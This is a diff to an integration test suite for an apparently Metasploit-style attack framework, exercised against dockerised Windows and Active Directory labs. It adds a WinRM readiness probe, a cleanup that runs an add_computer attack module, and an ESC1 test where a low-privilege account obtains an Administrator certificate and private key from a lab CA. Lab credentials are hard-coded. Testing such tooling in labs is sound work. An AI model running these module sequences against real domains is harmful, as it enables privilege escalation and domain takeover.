@@ -898,13 +898,19 @@ class TestWinrmLoginLab(unittest.TestCase):
     def setUpClass(cls):
         cls.manager = LabManager(ROOT / "labs")
         cls.manager.up("windows")
+        # TCP-connect readiness is not enough: docker's port proxy
+        # answers long before the WinRM service inside Windows does —
+        # probe the actual HTTP listener (/wsman answers 405/401)
         deadline = time.time() + 300
         while time.time() < deadline:
             try:
-                with socket.create_connection((HOST, 15985), timeout=3):
-                    break
+                with socket.create_connection((HOST, 15985), timeout=3) as s:
+                    s.sendall(b"GET /wsman HTTP/1.0\r\n\r\n")
+                    if s.recv(64).startswith(b"HTTP/"):
+                        break
             except OSError:
-                time.sleep(5)
+                pass
+            time.sleep(5)
         else:
             cls.manager.down("windows")
             raise RuntimeError("windows lab WinRM not up within 300s")
@@ -2781,6 +2787,28 @@ class TestAddComputerRbcdLab(unittest.TestCase):
     def setUpClass(cls):
         cls.manager = LabManager(ROOT / "labs")
         up_ad_lab(cls.manager)
+        # ad-state persists Samba's database across runs — a previously
+        # interrupted lifecycle leaves FZTEST02$ behind and the create
+        # below then fails with STATUS_USER_EXISTS. Clear it first
+        # (deleting a missing account just errors; ignored).
+        registry = ModuleRegistry(ROOT / "modules")
+        registry.load()
+        console = FrameworkConsole(registry, Store(":memory:"))
+        try:
+            with contextlib.redirect_stdout(io.StringIO()):
+                for command in (
+                    "use auxiliary/attack/add_computer",
+                    f"set RHOSTS {HOST}",
+                    "set DOMAIN forge.local",
+                    "set USERNAME Administrator",
+                    "set PASSWORD P@ssw0rd123",
+                    "set COMPUTER_NAME FZTEST02$",
+                    "set DELETE true",
+                    "run",
+                ):
+                    console.onecmd(command)
+        finally:
+            console.store.close()
 
     @classmethod
     def tearDownClass(cls):
@@ -3049,6 +3077,91 @@ class TestDomainFullLab(unittest.TestCase):
             conn.login("labadmin", "Labpass2024!")
         finally:
             conn.close()
+
+
+@unittest.skipUnless(docker_available(), "docker daemon not available")
+@unittest.skipUnless(impacket_available(), "impacket not installed")
+@unittest.skipUnless(windows_lab_enabled(), "set FORGE_WINDOWS_LAB=1 to enable")
+class TestEsc1Lab(unittest.TestCase):
+    """esc1 against the domain lab's CA: analyst requests a VulnWeb cert
+    for Administrator@forge.local — the enrollee-supplied-SAN win, end
+    to end against a real Enterprise CA."""
+
+    @classmethod
+    def setUpClass(cls):
+        from impacket.smbconnection import SMBConnection
+
+        cls.manager = LabManager(ROOT / "labs")
+        cls.manager.up("domain")
+        # the CA installs Windows, joins, installs AD CS (~30 min cold):
+        # wait for its oem sentinel
+        deadline = time.time() + 3600
+        while time.time() < deadline:
+            try:
+                conn = SMBConnection(HOST, HOST, sess_port=4445, timeout=10)
+                conn.login("Administrator", "P@ssw0rd123", "forge.local")
+                buf = []
+                conn.getFile("C$", r"OEM\CA-READY.txt", buf.append)
+                raw = b"".join(buf)
+                # PowerShell's Out-File writes UTF-16LE (BOM) on 5.1 —
+                # sniff rather than assume, or the wait never ends
+                if raw.startswith(b"\xff\xfe"):
+                    text = raw[2:].decode("utf-16-le", "replace").strip()
+                else:
+                    text = raw.decode("utf-8", "replace").strip()
+                if text == "ready":
+                    conn.close()
+                    break
+                conn.close()
+            except Exception:
+                time.sleep(20)
+
+    @classmethod
+    def tearDownClass(cls):
+        cls.manager.down("domain")
+
+    def test_analyst_enrolls_as_administrator(self):
+        registry = ModuleRegistry(ROOT / "modules")
+        registry.load()
+        console = FrameworkConsole(registry, Store(":memory:"))
+        try:
+            out = ""
+            # a freshly-(re)started CA can answer the cert pipe before
+            # its own AD reads have settled — the policy module then
+            # denies with 0x80070576 "could not find required AD
+            # information" for several minutes. Retry through it; the
+            # assertions below still judge only the final attempt.
+            for _attempt in range(15):
+                buf = io.StringIO()
+                with contextlib.redirect_stdout(buf):
+                    for command in (
+                        "use auxiliary/attack/esc1",
+                        f"set RHOSTS {HOST}",
+                        "set RPORT 4445",
+                        # the lab's CA rides a port mapping (4445->445 on
+                        # 127.0.0.1); its dNSHostName resolves to the
+                        # container IP, unreachable from here — the CA_HOST
+                        # override exists for exactly this
+                        f"set CA_HOST {HOST}",
+                        "set DOMAIN forge.local",
+                        "set USERNAME analyst",
+                        "set PASSWORD Summer2024!",
+                        "run",
+                    ):
+                        console.onecmd(command)
+                out = buf.getvalue()
+                if "cert issued for Administrator@forge.local" in out:
+                    break
+                time.sleep(30)
+            self.assertNotIn("Traceback", out)
+            self.assertIn("forge-CA", out)
+            self.assertIn("cert issued for Administrator@forge.local", out)
+            loot = console.store.loot("cert")
+            self.assertEqual(len(loot), 1)
+            self.assertIn("BEGIN CERTIFICATE", loot[0]["content"])
+            self.assertIn("BEGIN PRIVATE KEY", loot[0]["content"])
+        finally:
+            console.store.close()
 
 
 @unittest.skipUnless(docker_available(), "docker daemon not available")
